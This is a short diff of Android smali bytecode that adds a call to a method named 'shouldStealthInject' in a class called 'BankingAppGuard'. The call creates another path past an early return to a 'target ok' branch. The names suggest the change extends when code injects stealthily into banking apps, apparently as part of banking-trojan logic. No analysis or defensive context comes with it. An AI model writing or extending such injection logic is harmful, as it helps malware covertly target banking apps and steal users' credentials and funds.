@@ -4680,6 +4680,12 @@
 
     if-nez v6, :cond_target_ok
 
+    invoke-static {p0}, Lcom/floatingmenu/BankingAppGuard;->shouldStealthInject(Ljava/lang/String;)Z
+
+    move-result v6
+
+    if-nez v6, :cond_target_ok
+
     return-void
 
     :cond_target_ok
